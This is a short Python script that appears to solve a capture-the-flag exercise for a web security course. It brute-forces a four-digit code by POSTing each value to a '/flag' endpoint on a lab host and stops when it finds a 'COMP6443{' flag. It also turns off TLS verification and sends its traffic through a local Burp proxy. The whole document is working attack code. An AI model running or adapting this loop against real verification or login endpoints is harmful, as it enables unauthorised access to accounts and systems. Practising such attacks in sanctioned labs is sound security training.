import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urljoin
import time

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session()
s.verify = False
# Comment out proxies if you don't need to see every request in Burp
s.proxies = {"https": "http://127.0.0.1:8080"}

url = "https://quoccaair-ff.quoccacorp.com/flag"

print("[*] Starting brute force...")

for i in range(7439, 9999 + 1):
    # Format number as a 4-digit string with leading zeros
    code = f"{i:04d}"
    time.sleep(0.1)  # Sleep to avoid overwhelming the server (adjust as needed)
    
    # Send the POST request
    response = s.post(url, data={"code": code})
    
    # Check if the response contains the flag (usually starts with COMP or has 'flag')
    if "COMP6443{" in response.text:
        flag = re.search(r"COMP6443\{.*?\}", response.text).group(0)
        print(f"\n\n[!] FLAG FOUND at {url}: {flag}")
        break
        
    if i % 100 == 0:
        print(f"[*] Testing: {code}", end="\r")